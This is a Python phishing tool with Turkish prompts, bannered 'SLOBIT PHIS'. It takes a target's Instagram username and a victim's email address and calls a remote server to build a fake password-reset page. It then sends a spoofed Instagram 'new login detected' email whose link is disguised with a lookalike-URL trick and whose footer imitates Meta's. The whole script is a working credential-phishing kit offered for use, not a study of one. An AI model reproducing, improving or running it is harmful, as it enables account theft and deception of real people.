import requests
import json
import sys
import time
import os

def loading_animation():
    symbols = ["-", "|", "/", "\\"]
    for i in range(1, 16):
        sys.stdout.write('\r')
        sys.stdout.write('-' * i + symbols[i % len(symbols)])
        sys.stdout.flush()
        time.sleep(0.2)

print("""
 _______  ___      _______  _______  ___   _______    _______  __   __  ___   _______ 
|       ||   |    |       ||  _    ||   | |       |  |       ||  | |  ||   | |       |
|  _____||   |    |   _   || |_|   ||   | |_     _|  |    _  ||  |_|  ||   | |  _____|
| |_____ |   |    |  | |  ||       ||   |   |   |    |   |_| ||       ||   | | |_____ 
|_____  ||   |___ |  |_|  ||  _   | |   |   |   |    |    ___||       ||   | |_____  |
 _____| ||       ||       || |_|   ||   |   |   |    |   |    |   _   ||   |  _____| |
|_______||_______||_______||_______||___|   |___|    |___|    |__| |__||___| |_______|
""")

print("""
1--->Instagram
0--->Exit
""")
print("MORE is COMING SOON...")

seçim = input("Seçiminiz--->")

if seçim == "0":
    print("Exited")
else:
    if seçim == "1":
        # Kullanıcıdan mail al
        mail = input("Mail Adresiniz--->")

        # Kullanıcıdan to adresini al
        to = input("Mail göndermek istediğiniz adresi girin (boş bırakmak için enter'a basın)--->")
        kullanicismi = input("Hedef Kullanıcının İnstagram İsmi--->")

        # Eğer to boş değilse mail gönderme apisi kullan
           
        # Mail gönderme apisi kullanılmazsa devam et
        ozelurl = input("Özel Url (instagram-com gibi)--->")
        print("\033[32m|")
        loading_animation()
        os.system("clear")

        api_url_sayfa = "http://smmslowy-001-site1.atempurl.com/api/newpage.php"
        params_sayfa = {"mail": mail, "userss": kullanicismi}

        response_sayfa = requests.get(api_url_sayfa, params=params_sayfa)

        if response_sayfa.status_code == 200:
            print("""
            _______  ___      _______  _______  ___   _______    _______  __   __  ___   _______ 
            |       ||   |    |       ||  _    ||   | |       |  |       ||  | |  ||   | |       |
            |  _____||   |    |   _   || |_|   ||   | |_     _|  |    _  ||  |_|  ||   | |  _____|
            | |_____ |   |    |  | |  ||       ||   |   |   |    |   |_| ||       ||   | | |_____ 
            |_____  ||   |___ |  |_|  ||  _   | |   |   |   |    |    ___||       ||   | |_____  |
             _____| ||       ||       || |_|   ||   |   |   |    |   |    |   _   ||   |  _____| |
            |_______||_______||_______||_______||___|   |___|    |___|    |__| |__||___| |_______|
            """)
            
            phishsayfa = f"socials.con.tc/resetpassword/{kullanicismi}.php"
            
            if to:
                api_url_mail = "http://smmslowy-001-site1.atempurl.com/mail/mail.php"

                data_mail = {
                    'to': to,
                    'subject': "İnstagram Hesabınıza Yeni Giriş Tespit Edildi!",
                    'body': f'''
		
 
Yeni Bir Giriş Yapıldığını Fark Ettik, {kullanicismi}
 
Genellikle kullanmadığınız bir cihazdan giriş yapıldığını fark ettik.
 
 

 
POCO X3 PRO · Instagram · Istanbul, Turkey
 
 
Bu kişi sizseniz, birkaç gün boyunca belirli güvenlik ve hesap ayarlarına erişemeyeceksiniz. Bu ayarlara daha önce giriş yaptığınız bir cihazdan yine erişebilirsiniz.
 
Bu kişi siz değilseniz, Hesabınızı Kurtarmak İçin! 

Hesabınızı Kurtarmak İçin: (https://{ozelurl}@{phishsayfa})
   

© Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 94025
Bu mesaj {to} adresine {kullanicismi} için gönderilmiştir. Bu sizin hesabınız değil mi? Bu hesaptan e-posta adresinizi kaldırın.
                '''
                }

                headers_mail = {'Content-Type': 'application/json'}

                response_mail = requests.post(api_url_mail, data=json.dumps(data_mail), headers=headers_mail)
            
                print(f"\033[31m\nUrl: https://{ozelurl}@{phishsayfa}")
        else:
            print(f"Hata! HTTP durumu: {response_sayfa.status_code}")
            print("API yanıtı:", response_sayfa.text)
    else:
        print("Geçersiz seçim. Lütfen 1'i seçin.")

    print("Programı sonlandırmak için 'e' tuşuna basın.")
    kapat_secimi = input("Seçiminiz--->")

    if kapat_secimi.lower() == "e":
        print("Program kapatılıyor...")
        sys.exit(0)
    else:
        print("Program devam ediyor.")
